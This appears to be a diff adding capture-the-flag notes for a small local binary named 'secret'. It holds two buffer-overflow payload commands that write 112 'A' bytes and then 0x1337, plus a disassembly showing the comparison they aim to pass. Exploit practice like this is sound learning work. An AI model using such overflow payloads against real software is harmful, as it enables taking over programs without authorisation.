@@ -1,0 +1,8 @@
+run $(python2 -c 'print "A"*112 + "\x37\x13"')
+
+python2 -c 'print "A"*112 + "\x37\x13\x00\x00"' | ./secret
+
+   0x0000000000001228 <+159>:   cmp    DWORD PTR [rbp-0x74],0x1337
+   0x000000000000122f <+166>:   jne    0x123f <main+182>
+   0x0000000000001231 <+168>:   lea    rdi,[rip+0xdd0]        # 0x2008
+   0x0000000000001238 <+175>:   call   0x1070 <puts@plt>
